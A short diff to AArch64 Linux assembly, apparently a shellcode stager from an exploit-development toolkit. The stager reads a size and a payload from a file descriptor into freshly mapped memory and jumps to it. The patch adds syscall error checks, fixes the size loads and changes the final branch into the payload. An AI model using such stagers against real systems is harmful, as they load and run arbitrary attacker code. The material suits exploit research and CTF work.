@@ -37,9 +37,10 @@ start:
     mov    x2, #4
     mov    x8, SYS_READ
     svc    0
-    cbz    w0, failed
+    cmn    x0, #0x1
+    beq    failed
 
-    ldr    x2, [sp,#0]
+    ldr    w2, [sp,#0]
 
     /* Page-align, assume <4GB */
     lsr    x2, x2, #12
@@ -53,12 +54,13 @@ start:
     mov    x3, #34
     mov    x4, xzr
     mov    x5, xzr
-    /* call mmap() */
-    movi   x8, SYS_MMAP
+    mov    x8, SYS_MMAP
     svc    0
+    cmn    x0, #0x1
+    beq    failed
 
     /* Grab the saved size, save the address */
-    ldr    x4, [sp]
+    ldr    w4, [sp]
 
     /* Save the memory address */
     str    x0, [sp]
@@ -73,13 +75,15 @@ read_loop:
     mov    x2, x4
     mov    x8, SYS_READ
     svc    0
+    cmn    x0, #0x1
+    beq    failed
     add    x3, x3, x0
     subs   x4, x4, x0
     bne    read_loop
 
     /* Go to shellcode */
-    ldr    x30, [sp]
-    ret
+    ldr    x0, [sp]
+    blr    x0
 
 failed:
     mov    x0, 0
